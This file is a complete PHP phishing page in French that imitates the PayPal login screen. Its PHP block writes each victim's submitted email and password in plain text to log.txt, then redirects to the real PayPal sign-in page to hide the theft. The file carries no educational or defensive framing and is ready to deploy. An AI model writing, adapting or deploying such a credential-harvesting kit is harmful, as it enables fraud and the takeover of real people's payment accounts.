<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['login_email'];
    $pass = $_POST['password'];
    
    $file = fopen("log.txt", "a");
    fwrite($file, "Email: $email | Password: $pass\n");
    fclose($file);
    
    header("Location: https://www.paypal.com/signin");
    exit();
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Connexion PayPal</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f5f7fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 350px; text-align: center; }
        img { max-width: 150px; margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 14px; background-color: #0070ba; color: white; border: none; border-radius: 25px; font-size: 16px; cursor: pointer; font-weight: bold; }
        button:hover { background-color: #005ea6; }
        a { color: #0070ba; font-size: 14px; text-decoration: none; display: block; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.paypalobjects.com/webstatic/icon/logo-paypal.png" alt="PayPal Logo">
        
        <form method="POST" action="">
            <input type="text" name="login_email" placeholder="Adresse e-mail ou numéro de portable" required>
            <input type="password" name="password" placeholder="Mot de passe" required>
            <button type="submit">Se connecter</button>
            <a href="#">Mot de passe oublié ?</a>
        </form>
    </div>
</body>
</html>